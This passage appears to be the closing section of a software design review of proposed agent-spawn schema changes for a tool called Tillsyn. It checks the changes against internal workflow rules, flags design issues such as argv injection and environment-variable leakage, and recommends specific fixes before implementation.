**`feedback_no_closeout_md_pre_dogfood.md` — clean.** F.7.17 + F.7.18 add no rollup MDs (LEDGER, REFINEMENTS, etc.). Worklog MDs per droplet are kept (in scope of pre-MVP convention). **No conflict.**

**`feedback_orchestrator_no_build.md` — NEAR-MISS, with a nit.** Orch never edits Go code; always spawns a builder. F.7.17 + F.7.18 are pure-design changes — no edits in scope of this falsification review. The schema additions, when implemented, will be done by builder subagents per the cascade. **But:** F.7.18's "default-template seeds" subsection says "Templates (or adopters) that want full live MCP querying inside the spawn just leave the `[agent_bindings.<kind>.context]` table absent" (line 159) — the *default* template lives at `internal/templates/builtin/default.toml` (and post-F.2 at `default-go.toml`). Editing the default template seeds is a Go-package-tree edit, builder-territory. Fine — no orchestrator-edits-go violation. **Nit:** F.7.18's prose conflates "template" (project-author config) with "default template" (Tillsyn-shipped binary asset). Make sure the planning droplet for the seeds explicitly routes through a builder spawn, not orchestrator hand-edit.

**`feedback_opus_builders_pre_mvp.md` — clean.** F.7.17's `command = "valv claude"` / `command = "claude"` doesn't constrain the model. F.7.17's `[agent_bindings.<kind>.model]` (existing field at `schema.go:292`) is independent. Builders run opus per the rule. F.7.18 adds no model-switching logic. **No conflict.**

**Cross-cutting nit — feedback_subagents_background_default.md.** F.7.4's stream-JSON monitor parser + F.7.5's permission-denial → TUI handshake imply long-running monitor goroutines on the orchestrator side. The "subagents background default" rule applies to subagent spawn, but the monitor itself runs in the orchestrator's process. Not in conflict with the rule, but worth surfacing: F.7.4's monitor design needs to handle the orchestrator-restart case (V11's broader "what happens when the dev re-launches Tillsyn during a long spawn" — covered by F.7.8 crash-recovery).

**Mitigation.**

- In the planning droplet for F.7.18 seeds, explicitly call out: "edits to `internal/templates/builtin/default-go.toml` are builder-territory; orchestrator hand-edits would violate `feedback_orchestrator_no_build.md`."
- Document in F.7.18's prose the "default template" vs "project template" distinction: "default template" = Tillsyn-shipped, lives in repo, builder-edited; "project template" = adopter's `<project>/.tillsyn/template.toml`, dev-edited.

---

## Overall verdict

**NEEDS-REWORK.**

Tally: **8 CONFIRMED**, **4 PASS-WITH-NIT**, **2 REFUTED**, **1 PASS-WITH-NIT (near-miss memory rule)**.

**CONFIRMED counterexamples (must address before plan-QA twins fire):**

- V1 (CLIAdapter byte-line signature wrong-shape for SSE / WebSocket / hybrid CLIs).
- V2 (`command` string field — argv injection vector if shell-tokenized; needs list-form spec).
- V3 (`env` forwarding leak — `os.Environ()` inheritance default isn't denied; need closed baseline + opt-in allow-list).
- V5 (planner descendants schema validation — too-strict reject; demote to warn).
- V6 (token-budget priority — "largest" ambiguous; need explicit `priority` field + algorithm).
- V10 (ancestor-walk runtime cost — no depth cap, no aggregator-duration cap).
- V11 (Valv-not-installed UX — error message gives no guidance).
- V12 (round-history YAGNI — doesn't carry the load-bearing fix-builder signals).
- V14 (F.7.17 + F.7.18 schema-additions ordering — needs explicit "all-or-nothing droplet" or "schema-version bump at theme end" decision).

**PASS-WITH-NITs (address at full-planning time, not blocking):**

- V4 (one accidental-mandate signal in F.7.18 prose; reword line 181).
- V8 (no schema collision today, but reserve the new TOML keys defensively).
- V9 (sequencing — recommend option C: claude-only Drop 5, Drop 4d follows).
- V15 (memory-rule near-miss on default-template-edit being builder-territory).

**REFUTED cleanly:**

- V7 (per-binding env scoping is correct; document name-collision caveat).
- V13 (per-binding aggregator scope is O(rules-on-spawning-kind), not O(all-rules)).

**Recommended action.** Update SKETCH.md to address the 9 CONFIRMED items before authoring the full PLAN.md. Specifically:

1. Replace `command` string with `command []string` (argv list form).
2. Spec env-isolation primitive: closed baseline + opt-in allow-list, NOT `os.Environ()` inheritance.
3. Reword F.7.18 line 181 for parallel-structure framing.
4. Demote planner descendants validation from `error` to `warn` or scope to default template only.
5. Add `priority` field to context rules + spec budget-overflow algorithm.
6. Add `max_ancestor_depth` + `max_aggregator_duration` limits.
7. Spec `exec.ErrNotFound` UX for missing wrapper binaries.
8. Drop `include_round_history` from initial scope; defer until concrete use case.
9. Decide schema-additions ordering (all-or-nothing droplet OR theme-end schema-version bump).
10. Replace `ParseStreamEvent(line []byte)` with `ConsumeStream(ctx, io.Reader, sink)` push model + `TerminalReport` value object.

After the rework, re-run plan-QA twins on the updated SKETCH before any builder fires.
